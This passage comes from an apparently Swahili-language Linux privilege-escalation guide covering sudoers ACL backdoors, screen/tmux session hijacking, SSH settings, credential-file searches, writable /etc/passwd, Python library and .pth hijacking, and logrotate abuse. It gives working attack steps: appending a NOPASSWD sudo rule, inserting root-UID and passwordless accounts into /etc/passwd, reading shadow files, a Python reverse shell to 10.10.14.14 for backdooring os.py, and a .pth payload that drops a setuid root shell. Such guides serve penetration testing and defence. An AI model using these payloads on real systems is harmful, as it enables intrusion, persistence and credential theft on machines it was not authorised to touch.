setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```

**Pata** faili zenye ACL mahususi kutoka kwenye mfumo:

```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```

### Backdoor ya ACL iliyofichwa kwenye faili za drop-in za sudoers

Mpangilio usio sahihi unaotokea mara nyingi ni faili ndani ya `/etc/sudoers.d/` inayomilikiwa na root na yenye mode `440`, lakini bado inampa mtumiaji asiye na privilege ya juu ruhusa ya kuandika kupitia ACL.

```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```

Ukiona kitu kama `user:alice:rw-`, mtumiaji anaweza kuongeza kanuni ya sudo licha ya bits za ruhusa zenye vizuizi:

```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```

Hii ni njia ya persistence/privesc yenye athari kubwa kwa sababu ni rahisi kuikosa katika ukaguzi unaotegemea `ls -l` pekee.

## Vipindi vya shell vilivyo wazi

Ufikiaji wa GNU Screen kati ya watumiaji hutegemea **usanidi na ACL ya kipindi kinachoendeshwa**, si toleo lake pekee. [GNU Screen documents](https://www.gnu.org/software/screen/manual/html_node/Multiuser-Session.html) kwamba lazima ijengwe ikiwa na usaidizi wa multiuser; `multiuser on` na ruhusa ya `acladd` au `aclchg` inayofaa humruhusu mtumiaji mwingine kuunganisha. [The manual also requires setuid-root](https://www.gnu.org/software/screen/manual/html_node/Invoking-Screen.html) kwa ajili ya utafutaji wa kipindi kati ya watumiaji. Soketi inayoonekana kuwa inamilikiwa na root au binary ya `screen` ya SUID pekee haithibitishi kuwa kuna shell ya root inayoweza kuunganishwa. Thibitisha kuwa kipindi kinachoendelea ni cha multiuser, mtumiaji wa sasa ana ruhusa madhubuti ya kuingiza amri/kutumia amri, na shell katika kipindi hicho inaendeshwa na mmiliki mwenye upendeleo kabla ya kuichukulia kama njia ya kupata upendeleo.

### screen sessions hijacking

**Orodhesha vipindi vya screen**

```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```

![screen sessions hijacking - Mahali pa Socket (baadhi ya mifumo huonyesha moja kama symlink ya nyingine): ls /run/screen/ /var/run/screen/ 2 /dev/null](<../../images/image (141).png>)

**Unganisha kwenye session**

```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```

## tmux sessions hijacking

Hili lilikuwa tatizo katika **matoleo ya zamani ya tmux**. Sikuweza kuteka session ya tmux (v2.1) iliyoundwa na root nikiwa mtumiaji asiye na privileged.

**Orodhesha tmux sessions**

```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```

![Mahali pa socket (baadhi ya mifumo huonyesha moja kama symlink ya nyingine) - tmux sessions hijacking: tmux -S /tmp/dev sess ls Orodhesha kwa kutumia socket hiyo, unaweza kuanzisha tmux session kwenye socket hiyo...](<../../images/image (837).png>)

**Ambatisha kwenye session**

```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```

Angalia **Valentine box from HTB** kwa mfano.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Keys zilizozalishwa kwa builds za OpenSSL zilizoathirika za Debian au derivatives katika kipindi cha kihistoria cha udhaifu zinaweza kuwa na randomness inayoweza kutabirika; distribution ya sasa ya host au toleo la OpenSSL lililowekewa patch halithibitishi jinsi key ya zamani ilivyozalishwa. Kagua **key husika** dhidi ya orodha inayofaa ya kihistoria ya keys dhaifu na chunguza ilikotoka. Mwongozo wa Debian [`ssh-vulnkey`](https://manpages.debian.org/wheezy/openssh-client/ssh-vulnkey.1.en.html) unaeleza jinsi ya kukagua public keys na `authorized_keys`, na [DSA-1571-1](https://security-tracker.debian.org/tracker/DSA-1571-1) inaandika kuhusu marekebisho ya OpenSSL. Ingizo kwenye `authorized_keys` ya akaunti yenye upendeleo ni kidokezo cha privilege escalation tu ikiwa private key inayolingana inaweza kupatikana na sera ya SSH inayotumika bado inakubali key hiyo kwa akaunti husika; **host** key dhaifu si credential ya kuingia yenyewe. Badilisha keys zilizoathirika na uondoe ruhusa zake za zamani.

### Thamani za kuvutia za usanidi wa SSH

- **PasswordAuthentication:** Hubainisha kama uthibitishaji kwa password unaruhusiwa. Default ya upstream OpenSSH ni `yes`; usanidi wa distribution unaweza kuibadilisha.
- **PubkeyAuthentication:** Hubainisha kama uthibitishaji kwa public key unaruhusiwa. Default ni `yes`.
- **PermitEmptyPasswords**: Ikiwa uthibitishaji kwa password unaruhusiwa, hubainisha kama server inaruhusu kuingia kwenye akaunti zenye password tupu. Default ni `no`.

### Faili za udhibiti wa kuingia

Faili hizi huathiri nani anaweza kuingia na jinsi:

- **`/etc/nologin`**: ikiwa ipo, huzuia watumiaji wasio root kuingia na kuonyesha ujumbe wake.
- **`/etc/securetty`**: huzuia mahali root anaweza kuingia (orodha ya TTY zinazoruhusiwa).
- **`/etc/motd`**: bango linaloonyeshwa baada ya kuingia (linaweza kuvuja taarifa za mazingira au matengenezo).

### PermitRootLogin

Hubainisha kama root anaweza kuingia kwa kutumia ssh. Default ya upstream OpenSSH ni `prohibit-password`; usanidi wa distribution unaweza kuibadilisha. Thamani zinazowezekana:

- `yes`: root anaweza kuingia kwa kutumia password na private key
- `without-password` au `prohibit-password`: root anaweza kuingia kwa kutumia private key pekee
- `forced-commands-only`: Root anaweza kuingia kwa kutumia private key pekee, na ikiwa chaguo za commands zimebainishwa
- `no` : hapana

### Mamlaka za cheti cha mtumiaji za SSH zinazoaminika

`TrustedUserCAKeys` hutaja public keys ambazo sshd inaziamini kusaini vyeti vya **mtumiaji**. Ikiwa private CA key inayolingana inaweza kusomwa na mtumiaji mwenye upendeleo mdogo, kagua nani anaweza kupata cheti na kinaweza kuthibitisha utambulisho wa akaunti zipi. `AuthorizedPrincipalsFile` au `AuthorizedPrincipalsCommand` zinaweza kuzuia majina yanayokubaliwa; ikiwa hakuna kati ya hizo iliyosanidiwa, cheti lazima kiwe na jina la akaunti lengwa. `PermitRootLogin prohibit-password` huzuia root kuingia kwa password lakini bado inaweza kuruhusu uthibitishaji kwa cheti. Njia ya key iliyo wazi pekee haithibitishi kuwa kuna ufikiaji: thibitisha jozi ya public/private key, sheria za `Match` zinazotumika, sera ya akaunti, passphrase ya key, revocation, na algorithms za signature zinazokubaliwa. Usijumuishe bytes za private key kwenye matokeo ya enumeration. Tazama [mwongozo wa usanidi wa server ya OpenSSH](https://man.openbsd.org/sshd_config#TrustedUserCAKeys).

Private CA key inaweza pia kutumika **bila kusomeka** na mtumiaji wa sasa ikiwa sheria ya privilege-delegation inamruhusu mtumiaji huyo kuendesha [certificate signer kama `ssh-keygen -s`](https://man.openbsd.org/ssh-keygen#-s) bila vizuizi, kwa utambulisho wa mmiliki wa key. Linganisha command na arguments zinazoruhusiwa hasa na ufikiaji wa akaunti ya signer kwa key, CA public key inayoaminika na usanidi wa sshd unaotumika, principal inayokubaliwa kwa akaunti lengwa, muda wa uhalali wa cheti, na sera ya kuingia ya akaunti hiyo. Command ya delegated signer au faili ya CA inayoaminika pekee havithibitishi ufikiaji wa akaunti nyingine; usisaini cheti cha majaribio wakati wa passive enumeration.

Kwa njia tofauti ya uaminifu wa CA kwa kila akaunti, tazama [mkanganyiko wa delimiter ya principal ya cheti cha SSH](../../../network-services-pentesting/pentesting-ssh.md#ssh-certificate-principal-delimiter-confusion).

### AuthorizedKeysFile

Hubainisha faili zenye public keys zinazoweza kutumiwa kwa uthibitishaji wa mtumiaji. Inaweza kuwa na tokens kama `%h`, ambazo zitabadilishwa na home directory. **Unaweza kubainisha absolute paths** (zinazoanza na `/`) au **relative paths kutoka kwenye home directory ya mtumiaji**. Kwa mfano:

```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```

Configuration hiyo itaonyesha kwamba ukijaribu kufanya **login** kwa kutumia **private** key ya mtumiaji "**testusername**", ssh italinganisha public key ya key yako na zile zilizo kwenye `/home/testusername/.ssh/authorized_keys` na `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding hukuruhusu **kutumia SSH keys zako za ndani badala ya kuziacha** (bila passphrases!) kwenye server yako. Hivyo, utaweza **kuruka** kupitia ssh **kwenda kwenye host** na kutoka hapo **kuruka kwenda kwenye host nyingine** **kwa kutumia** **key** iliyo kwenye **host yako ya awali**.

Unahitaji kuweka chaguo hili kwenye `$HOME/.ssh.config` kama hivi:

```
Host example.com
  ForwardAgent yes
```

Kumbuka kwamba ikiwa `Host` ni `*`, kila mara mtumiaji anapohamia kwenye mashine nyingine, mashine hiyo itaweza kufikia keys (jambo ambalo ni tatizo la usalama).

Faili `/etc/ssh_config` inaweza **kubatilisha** **options** hizi na kuruhusu au kukataa usanidi huu.\
Faili `/etc/sshd_config` inaweza **kuruhusu** au **kukataa** uelekezaji wa ssh-agent kwa kutumia keyword `AllowAgentForwarding` (kwa chaguomsingi, umeruhusiwa).

Ukigundua kuwa Forward Agent imesanidiwa kwenye mazingira, soma ukurasa ufuatao kwa kuwa **unaweza kuitumia vibaya ili kupandisha marupurupu**:


{{#ref}}
../../user-information/ssh-forward-agent-exploitation.md
{{#endref}}

## Faili Zinazovutia

### Faili za profile

Faili `/etc/profile` na faili zilizo ndani ya `/etc/profile.d/` ni **scripts zinazotekelezwa mtumiaji anapoanzisha shell mpya**. Kwa hivyo, ukiweza **kuandika au kurekebisha mojawapo, unaweza kupandisha marupurupu**.

```bash
ls -l /etc/profile /etc/profile.d/
```

Ikiwa script yoyote isiyo ya kawaida ya profile itapatikana, unapaswa kuiangalia ili kutafuta **maelezo nyeti**.

### Faili za Passwd/Shadow

Kulingana na OS, faili za `/etc/passwd` na `/etc/shadow` zinaweza kutumia jina tofauti au zikawa na nakala rudufu. Kwa hivyo, inashauriwa **kuzitafuta zote** na **kuangalia kama unaweza kuzisoma** ili kuona **kama kuna hashes** ndani ya faili hizo:

```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```

Katika baadhi ya hali, unaweza kupata **password hashes** ndani ya faili la `/etc/passwd` (au faili linganifu)

```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```

### /etc/passwd Inayoweza Kuandikwa

Kwanza, tengeneza nenosiri kwa kutumia mojawapo ya amri zifuatazo.

```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```

Kisha ongeza mtumiaji hacker na uweke nenosiri lililotengenezwa.

```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```

Mfano: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Sasa unaweza kutumia amri ya `su` pamoja na `hacker:hacker`

Vinginevyo, unaweza kutumia mistari ifuatayo kuongeza mtumiaji bandia bila nenosiri.\
ONYO: unaweza kudhoofisha usalama wa sasa wa mashine.

```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```

KUMBUKA: Katika mifumo ya BSD, `/etc/passwd` hupatikana kwenye `/etc/pwd.db` na `/etc/master.passwd`; pia, `/etc/shadow` hubadilishwa jina na kuwa `/etc/spwd.db`.

Unapaswa kuangalia kama unaweza **kuandika katika baadhi ya faili nyeti**. Kwa mfano, unaweza kuandika katika **faili fulani ya usanidi wa huduma**?

```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```

Kwa mfano, ikiwa mashine inaendesha seva ya **tomcat** na unaweza **kurekebisha faili ya usanidi wa huduma ya Tomcat ndani ya /etc/systemd/,** basi unaweza kurekebisha mistari:

```
ExecStart=/path/to/backdoor
User=root
Group=root
```

Backdoor yako itatekelezwa Tomcat itakapoanzishwa tena.

### Kagua Folda

Folda zifuatazo zinaweza kuwa na nakala rudufu au taarifa za kuvutia: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Huenda hutaweza kusoma ya mwisho, lakini jaribu)

```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```

### Mahali Pasipo pa Kawaida/Faili Zinazomilikiwa

```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
      do printf "  Group $g:\n";
      find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
      done
done
```

### Faili zilizorekebishwa katika dakika za hivi karibuni

```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```

### Faili za DB za Sqlite

```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```

Kwa hifadhidata za programu zinazosomeka, kagua majina ya majedwali na safu wima ili kutafuta majina ya watumiaji na password hashes. Kupata hash, kurejesha nenosiri lake, na kuthibitisha kuwa limetumika tena kwa akaunti ya ndani ni hatua tofauti; mfuatano wa jumla wa herufi 32 za hexadecimal hautoshi kubaini kuwa ni MD5 au kuthibitisha ufikiaji wa akaunti.

### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml files

```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```

Ikiwa historia ya shell inayosomeka ina amri ya `sudo` ikifuatiwa na mstari mfupi unaofanana na nenosiri, kagua kwa mkono mistari inayoizunguka. Nenosiri lililoingizwa kwenye kidokezo cha kawaida cha `sudo` halihifadhiwi kwenye historia ya shell; mstari unaofuata ni ingizo linalowezekana kuingizwa kwenye shell kwa bahati mbaya tu, si uthibitisho wa nenosiri halali. Alama ya `.sudo_as_admin_successful` hurekodi matumizi ya awali, si ruhusa ya sasa.

### Faili zilizofichwa

```bash
find / -type f -iname ".*" -ls 2>/dev/null
```

### **Script/Binaries kwenye PATH**

```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```

### **Faili za wavuti**

```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```

### **Nakala rudufu**

Kagua faili zinazosomeka ndani ya saraka za nakala rudufu, pamoja na faili ambazo **majina** yake yana neno `backup`: kumbukumbu yenye jina lisiloeleweka au kiambishi tamati cha usimbaji fiche bado inaweza kufichua data ya zamani ya programu. Kumbukumbu iliyosimbwa kwa njia fiche ni mgombea tu wa kufichua data. Urejeshaji wa nenosiri, ukaguzi wa yaliyomo, urejeshaji wa hash ya programu, na kutumia tena nenosiri hilo kwa akaunti ya Unix ni hatua tofauti zinazohitaji kuthibitishwa; hash ndani ya kumbukumbu haithibitishi kuwa kuna njia ya kuingia kwenye mfumo wa ndani.

Nakala rudufu zinazosomeka za mashine pepe zinahitaji ukaguzi huohuo. Mipangilio ya VirtualBox ya `.vbox` inaweza kutambua picha za diski za `.vdi` zilizounganishwa na kuwa na metadata ya ufunguo wa diski uliosimbwa kwa njia fiche; [VirtualBox inaeleza kuwa ufunguo wa data uliosimbwa huhifadhiwa kwenye mipangilio ya mashine pepe](https://docs.oracle.com/en/virtualization/virtualbox/7.0/user/AdvancedTopics.html). Mipangilio na picha lazima zote ziweze kufikiwa kabla ya kukagua diski nje ya mfumo. Volumu ya mfumo-unganishi inaweza kuwa na [tabaka lake la usimbaji fiche la LUKS](https://gitlab.com/cryptsetup/cryptsetup/-/blob/main/man/cryptsetup.8.adoc), linalohitaji ufunguo tofauti. Hata baada ya kusimbua kwa idhini, hati-tumizi au mipangilio ya zamani inaweza kuwa na nenosiri; thibitisha kuwa kitambulisho hicho bado kinatumika kwa akaunti ya mwenyeji na kwamba sera yake ya `sudo` inayotumika inaruhusu amri yenye haki za juu kabla ya kuiita kupandisha haki za ndani. Orodhesha njia na ruhusa bila kunakili, kusimbua, au kupachika picha wakati wa uchunguzi wa awali usiobadilisha hali.

Unapokagua kumbukumbu inayosomeka, orodhesha majina ya vipengee vyake kabla ya kutoa faili yoyote: faili fiche za uthibitishaji, nyenzo za misimbo ya urejeshaji, au funguo za SSH zinaweza kuwepo hata kama nakala zinazotumika zinalindwa. Majina ya faili yanaashiria tu jambo la kufuatilia; thibitisha nyenzo na matumizi yake tena kwenye akaunti kando.

Pendelea **kumbukumbu zinazosomeka zinazomilikiwa na mtumiaji mwingine** katika saraka za nakala rudufu, hasa kumbukumbu zinazomilikiwa na root na zile zinazoweza kufikiwa kupitia uanachama wa kikundi. Kumbukumbu ya zamani inaweza kuwa na siri ya mipangilio au uthibitishaji hata kama nakala inayotumika inalindwa. Kwa kiolesura cha ndani cha usimamizi wa nakala rudufu kama [Backrest](https://garethgeorge.github.io/backrest/), angalia akaunti inayotumiwa na huduma na iwapo mtumiaji mwenye haki za chini anaweza kusoma mipangilio yake au kuthibitisha utambulisho wake kwenye kiolesura. [Hooks](https://garethgeorge.github.io/backrest/docs/hooks) zake na [kiolesura cha amri cha restic](https://github.com/garethgeorge/backrest/blob/main/proto/v1/service.proto) vinaweza kutumia haki za faili na amri za daemon; msikilizaji wa loopback pekee hauamui athari. `passwordBcrypt` ya Backrest ni hash ya bcrypt iliyosimbwa kwa base64 kwenye [msimbo wake wa uthibitishaji](https://github.com/garethgeorge/backrest/blob/main/internal/auth/auth.go), si nenosiri la maandishi ya kawaida. Thibitisha utambulisho wa huduma, vitambulisho vinavyoweza kutumika, na ufikiaji wa mpango au hifadhi husika kabla ya kuchukulia kumbukumbu au kiolesura kilichofichuliwa kuwa mpaka wa haki za ufikiaji.

```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```

### Faili zinazojulikana kuwa na nywila

Soma code ya [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS); hutafuta **faili kadhaa zinazoweza kuwa na nywila**.\
**Zana nyingine ya kuvutia** unayoweza kutumia kufanya hivyo ni: [**LaZagne**](https://github.com/AlessandroZ/LaZagne), programu huria inayotumika kupata nywila nyingi zilizohifadhiwa kwenye kompyuta ya ndani ya Windows, Linux na Mac.

Ikiwa `/etc/guacamole/guacamole.properties` inaweza kusomwa, kagua mipangilio yake ya muunganisho wa hifadhidata ya `mysql-*`, `postgresql-*` au `sqlserver-*`. Akaunti imeidhinishwa kusoma majedwali ya Guacamole JDBC, jedwali la `guacamole_connection_parameter` linaweza kuwa na thamani zilizohifadhiwa za SSH za `username`, `password`, `private-key` au `passphrase`. Anza kwa kukagua vitambulisho vya miunganisho na majina ya vigezo, kisha kagua safu zinazohusika pekee; thamani iliyohifadhiwa inaweza kuwa tokeni inayobadilika au rejeleo la vault badala ya siri inayoweza kutumiwa tena. Tazama [schema ya Guacamole JDBC](https://guacamole.apache.org/doc/gug/jdbc-auth-schema.html) na [vigezo vya muunganisho wa SSH](https://guacamole.apache.org/doc/gug/configuring-guacamole.html).

[Hifadhi chaguomsingi ya pswm password manager](https://github.com/Julynx/pswm#usage) ni vault iliyosimbwa kwa njia fiche iliyo katika `~/.local/share/pswm/pswm` kwa chaguomsingi. Ikiwa vault ya mtumiaji mwingine inaonekana, kagua umiliki wake na kama akaunti yako inaweza kweli kuisoma. Njia ya vault pekee haifichui taarifa za kuingia; kurejesha nywila yake kuu, kupata nywila ya akaunti inayoweza kutumiwa tena, na kuthibitisha ruhusa za akaunti hiyo ni hatua tofauti.

[Hifadhidata chaguomsingi ya Passpie](https://passpie.readthedocs.io/en/latest/faq.html#what-is-a-passpie-database) ni `~/.passpie/`, ikiwa na keyring ya `.keys` na faili za kitambulisho za `.pass` zilizosimbwa kwa njia fiche ndani ya saraka za vikundi. Saraka ya hifadhidata inayoonekana ni kidokezo cha njia tu: thibitisha ufikiaji wa ufunguo na ingizo husika lililosimbwa kwa njia fiche, kama passphrase kuu inahitajika, na kama taarifa za kuingia zilizorejeshwa ni za akaunti yenye ruhusa za juu zaidi. Passpie pia inatumia [njia maalum za hifadhidata](https://passpie.readthedocs.io/en/latest/getting_started.html#multiple-databases), kwa hivyo njia chaguomsingi si kamilifu. Uchanganuzi wa kiotomatiki unapaswa kuorodhesha metadata bila kuhamisha taarifa za kuingia nje au kuchapisha maudhui ya ufunguo.

### Logs

Ikiwa unaweza kusoma logs, unaweza kupata **taarifa za kuvutia/za siri ndani yake**. Kadiri log inavyokuwa ya ajabu, ndivyo itakavyokuwa ya kuvutia zaidi (huenda).\
Pia, baadhi ya **audit logs** zilizosanidiwa “vibaya” (zilizowekewa backdoor?) zinaweza kukuruhusu **kurekodi nywila** ndani ya audit logs, kama ilivyoelezwa kwenye chapisho hili: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).<sup>[[36]](#references)</sup>

```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```

Ili **kusoma logs, kundi** [**adm**](../../user-information/interesting-groups-linux-pe/index.html#adm-group) litakuwa na msaada mkubwa.

### Faili za Shell

```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```

### Utafutaji wa Creds/Regex wa Jumla

Unapaswa pia kutafuta faili zilizo na neno "**password**" kwenye **jina** lake au ndani ya **maudhui** yake, na pia utafute IP na barua pepe ndani ya logi, au regex za hash.\
Sitaorodhesha hapa jinsi ya kufanya haya yote, lakini ikiwa una nia unaweza kuangalia ukaguzi wa mwisho ambao [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) hufanya.

## Faili Zinazoweza Kuandikwa

### Python library hijacking

Ikiwa unajua **mahali** script ya python itatekelezwa na **unaweza kuandika ndani ya** folda hiyo au unaweza **kurekebisha maktaba za python**, unaweza kurekebisha maktaba ya OS na kuiwekea backdoor (ikiwa unaweza kuandika mahali script ya python itatekelezwa, nakili na ubandike maktaba ya os.py).

Ili **kuwekea maktaba backdoor**, ongeza tu mstari ufuatao mwishoni mwa maktaba ya os.py (badilisha IP na PORT):

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

#### `.pth` inayoweza kuandikwa na kuchakatwa na `site.addsitedir()`

Usichukulie `site.addsitedir(DIR)` kuwa sawa na `sys.path.append(DIR)`. Pia huchakata kila faili ya `*.pth` iliyo katika `DIR`. Mstari unaoanza na `import` ikifuatiwa na nafasi au tab hutekelezwa kama code ya Python. Mistari ya njia badala yake hutatuliwa kulingana na site directory na kuongezwa tu ikiwa njia hizo zipo.<sup>[[38]](#references)</sup>

Hili husababisha privilege escalation pale programu ya Python inayoendeshwa kwa ruhusa ya `sudo` au yenye mamlaka ya juu inapopiga simu kwa `site.addsitedir()` ikielekeza kwenye directory ambayo mtumiaji wa sasa au mojawapo ya makundi yake anaweza kuiandikia. Code ya `.pth` hutekelezwa programu hiyo yenye mamlaka ya juu inapoweka njia yake ya uingizaji, kabla ya kutekeleza kitendo chake cha kawaida.<sup>[[38]](#references)[[39]](#references)</sup>

```bash
# Find explicit consumers and inspect every selected directory's ownership
grep -R "site\.addsitedir" /opt /usr/local 2>/dev/null
namei -l /opt/app/plugins/dev
find /opt/app/plugins/dev -maxdepth 1 -type f -name '*.pth' -ls

# Verify execution through a one-line path configuration file
printf '%s\n' "import os; os.system('id')" > /opt/app/plugins/dev/probe.pth
sudo /usr/bin/python3 /opt/app/controller.py status
```

Maudhui yanayoweza kutekelezwa ya `.pth` lazima yawe kwenye mstari mmoja, lakini semicolon huruhusu kuweka kauli kadhaa. Kwa mfano, njia ya utekelezaji ya root inaweza kuunda nakala ya Bash ya setuid; iendeshe Bash kwa `-p` ili ihifadhi effective ID yake.<sup>[[39]](#references)</sup>

```bash
printf '%s\n' "import os; os.system('cp /bin/bash /tmp/rootshell; chmod 4755 /tmp/rootshell')" \
  > /opt/app/plugins/dev/pwn.pth
sudo /usr/bin/python3 /opt/app/controller.py status
/tmp/rootshell -p
```

Chaguo la `-S` huzima tu uanzishaji wa kiotomatiki wa Python wa `site`. Halilindi programu inayoingiza `site` waziwazi na kuita `site.addsitedir()`. Ondoa saraka zinazoweza kuandikwa na mshambuliaji kwenye njia za uingizaji zilizo na upendeleo, na hakikisha saraka na faili zake za `.pth` zinamilikiwa na kuandikwa na msimamizi mwenye upendeleo pekee.<sup>[[38]](#references)[[39]](#references)</sup>

### Unyonyaji wa logrotate

Kazi ya `logrotate` yenye upendeleo inaweza kuunda njia ya kuandika faili za mtumiaji mwingine ikiwa inazungusha logi iliyo chini ya saraka ambayo mtumiaji mwenye upendeleo wa chini anaweza kubadilisha au kuelekeza upya wakati wa mzunguko. Logi inayoweza kuandikwa pekee ni kidokezo tu. Thibitisha sheria halisi inayotumika na maagizo yake ya `create`, `olddir` na `su`; utambulisho halisi wa scheduler; haki za kuandika na kutafuta kwenye saraka mama ya logi; na kama build na sera zilizosakinishwa zinaruhusu kubadilisha lengwa. Shell yenye upendeleo itakayotumika baadaye lazima pia ipakie faili iliyotokana nayo ili uandishi wa faili ya kuanzisha programu uweze kusababisha utekelezaji wa amri. Kagua ratiba, sheria, toleo/ufungashaji na metadata ya njia bila kuanzisha mzunguko au kujaribu mashindano ya muda.

> [!TIP]
> Usichukulie `3.18.0` au namba yoyote ya toleo pekee kuwa kikomo cha uwezekano wa unyonyaji. [Rekodi ya mabadiliko ya upstream](https://github.com/logrotate/logrotate/blob/main/ChangeLog.md) inaonyesha uimarishaji dhidi ya masuala ya saraka na symlink katika matoleo mengi, na distributions zinaweza kurudisha marekebisho kwenye matoleo ya awali. [Mwongozo wa upstream](https://github.com/logrotate/logrotate/blob/main/logrotate.8.in) unapendekeza `su` wakati root inazungusha logi kwenye saraka zinazodhibitiwa na watumiaji wasio na upendeleo; thibitisha sheria inayotumika na tabia halisi.

Maelezo zaidi kuhusu udhaifu huu yanapatikana kwenye ukurasa huu: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).<sup>[[37]](#references)</sup>

Unaweza kutumia udhaifu huu kwa [**logrotten**](https://github.com/whotwagner/logrotten).

Udhaifu huu unafanana sana na [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(logi za nginx),** kwa hivyo kila unapogundua kuwa unaweza kubadilisha logi, angalia nani anazisimamia na kama unaweza kuongeza mapendeleo kwa kubadilisha logi hizo na symlink.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Rejeleo la udhaifu:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f).<sup>[[20]](#references)</sup>

